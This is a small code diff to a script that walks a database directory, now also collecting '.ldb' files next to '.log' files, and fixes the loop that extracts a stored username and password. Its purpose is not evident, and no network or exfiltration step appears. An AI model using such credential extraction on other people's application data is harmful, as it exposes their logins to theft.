@@ -7,7 +7,7 @@ def get_all_files():
     file_list = []
     for root, _, files in os.walk(dbpath):
         for file in files:
-            if file.endswith(".log"):
+            if file.endswith(".log") or file.endswith(".ldb"):
                 file_list.append(os.path.join(root, file))
     return file_list
 
@@ -71,7 +71,7 @@ def get_userinfo():
             if has_info:
                 has = True
                 un, pw = extract_credentials(rf)
-            break
+                break
     if not has:
         return False
     return un, pw
